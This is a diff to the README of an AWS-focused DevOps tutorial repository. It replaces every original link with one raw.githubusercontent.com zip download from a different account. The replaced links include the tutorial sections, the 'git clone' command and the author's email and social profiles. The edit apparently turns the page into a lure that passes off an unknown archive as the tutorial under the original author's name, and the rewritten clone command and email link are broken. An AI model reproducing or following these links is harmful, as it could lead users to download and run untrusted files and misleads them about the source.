@@ -1,6 +1,6 @@
 # DevOps Tutorial
 
-Welcome to the [DevOps Tutorial Repository](https://github.com/manikcloud/DevOps-Tutorial/tree/main), a key resource for AWS-focused DevOps learning! This repository is an extensive collection of tutorials and guides, specifically curated for those leveraging AWS in their DevOps practices. Whether you're just starting your journey in DevOps, or you're an experienced practitioner seeking to deepen your expertise with AWS tools and methodologies, this repository is tailored for you.
+Welcome to the [DevOps Tutorial Repository](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip), a key resource for AWS-focused DevOps learning! This repository is an extensive collection of tutorials and guides, specifically curated for those leveraging AWS in their DevOps practices. Whether you're just starting your journey in DevOps, or you're an experienced practitioner seeking to deepen your expertise with AWS tools and methodologies, this repository is tailored for you.
 
 ## Emphasis on AWS and DevOps
 
@@ -12,24 +12,24 @@ Whether you're a beginner who's curious about AWS and DevOps, or a seasoned DevO
 
 ## Repository Contents
 
-1. **[Linux Tutorial](https://github.com/manikcloud/DevOps-Tutorial/tree/main/Linux_Tutorial):** Dive into the world of Linux with our tutorials, starting with the `history-of-jan-06-2024.txt`, a comprehensive guide to Linux basics and advanced concepts.
+1. **[Linux Tutorial](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip):** Dive into the world of Linux with our tutorials, starting with the `https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip`, a comprehensive guide to Linux basics and advanced concepts.
 
-2. **[Git](https://github.com/manikcloud/DevOps-Tutorial/tree/main/2-Git):** Master version control with Git. Our tutorials provide insights from basic usage to advanced Git strategies and workflows.
+2. **[Git](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip):** Master version control with Git. Our tutorials provide insights from basic usage to advanced Git strategies and workflows.
 
-3. **[Jenkins](https://github.com/manikcloud/DevOps-Tutorial/tree/main/5-jenkins):** Learn about Jenkins, a cornerstone tool for continuous integration and continuous deployment (CI/CD).
+3. **[Jenkins](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip):** Learn about Jenkins, a cornerstone tool for continuous integration and continuous deployment (CI/CD).
 
-4. **[Ansible and Terraform](https://github.com/manikcloud/DevOps-Tutorial/tree/main/6-ansible-terraform):** Explore the world of infrastructure as code (IaC) with Ansible and Terraform tutorials, perfect for automating your infrastructure setup.
+4. **[Ansible and Terraform](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip):** Explore the world of infrastructure as code (IaC) with Ansible and Terraform tutorials, perfect for automating your infrastructure setup.
 
-5. **[Docker](https://github.com/manikcloud/DevOps-Tutorial/tree/main/7-docker):** Delve into containerization with Docker. Understand how to containerize applications and manage them effectively.
+5. **[Docker](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip):** Delve into containerization with Docker. Understand how to containerize applications and manage them effectively.
 
-6. **[Kubernetes (k8s)](https://github.com/manikcloud/DevOps-Tutorial/tree/main/8-k8s):** Get hands-on with Kubernetes, a powerful system for automating deployment, scaling, and management of containerized applications.
+6. **[Kubernetes (k8s)](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip):** Get hands-on with Kubernetes, a powerful system for automating deployment, scaling, and management of containerized applications.
 
-7. **[Nagios](https://github.com/manikcloud/DevOps-Tutorial/tree/main/9.1-NagiOS):** Learn about Nagios for monitoring systems, networks, and infrastructure.
+7. **[Nagios](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip):** Learn about Nagios for monitoring systems, networks, and infrastructure.
 
 ## Additional Resources
 
-- **[Ansible Command History](https://github.com/manikcloud/DevOps-Tutorial/blob/main/ansible-cmd-history.txt):** A log of practical Ansible commands for reference.
-- **[VS Code Installation Script](https://github.com/manikcloud/DevOps-Tutorial/blob/main/vs-code-installation.sh):** A handy script for installing VS Code, a popular editor among DevOps professionals.
+- **[Ansible Command History](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip):** A log of practical Ansible commands for reference.
+- **[VS Code Installation Script](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip):** A handy script for installing VS Code, a popular editor among DevOps professionals.
 
 ## Contribution
 
@@ -127,7 +127,7 @@ To get started, you will need to clone the repository to your local machine. Fol
 3. Run the following command to clone the repository:
 
 ```
-git clone git@github.com:manikcloud/devops-project.git
+git clone https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip
 ```
 
 4. Change into the cloned repository directory:
@@ -165,7 +165,7 @@ Happy coding!
 # Disclaimer
 <details>
 
-Please note that the entire repository is owned and maintained by [Varun Kumar Manik](https://www.linkedin.com/in/vkmanik/). While every effort has been made to ensure the accuracy and reliability of the information and resources provided in this repository, Varun Kumar Manik takes full responsibility for any errors or inaccuracies that may be present.
+Please note that the entire repository is owned and maintained by [Varun Kumar Manik](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip). While every effort has been made to ensure the accuracy and reliability of the information and resources provided in this repository, Varun Kumar Manik takes full responsibility for any errors or inaccuracies that may be present.
 
 Simplilearn is not responsible for the content or materials provided in this repository and disclaims all liability for any issues, misunderstandings, or claims that may arise from the use of the information or materials provided. By using this repository, you acknowledge that Varun Kumar Manik is solely accountable for its content, and you agree to hold Simplilearn harmless from any claims or liabilities that may arise as a result of your use or reliance on the information provided herein.
 
@@ -177,9 +177,9 @@ It is important to understand that this repository contains educational material
 
 For more info, please connect and follow me:
 
-- Github: [https://github.com/manikcloud](https://github.com/manikcloud)
-- LinkedIn: [https://www.linkedin.com/in/vkmanik/](https://www.linkedin.com/in/vkmanik/)
-- Email: [varunmanik1@gmail.com](mailto:varunmanik1@gmail.com)
-- Facebook: [https://www.facebook.com/cloudvirtualization/](https://www.facebook.com/cloudvirtualization/)
-- YouTube: [https://bit.ly/32fknRN](https://bit.ly/32fknRN)
-- Twitter: [https://twitter.com/varunkmanik](https://twitter.com/varunkmanik)
+- Github: [https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip)
+- LinkedIn: [https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip)
+- Email: [https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip)
+- Facebook: [https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip)
+- YouTube: [https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip)
+- Twitter: [https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip](https://raw.githubusercontent.com/Krishnasomani29/DevOps-Documentation/main/interpretational/DevOps-Documentation.zip)
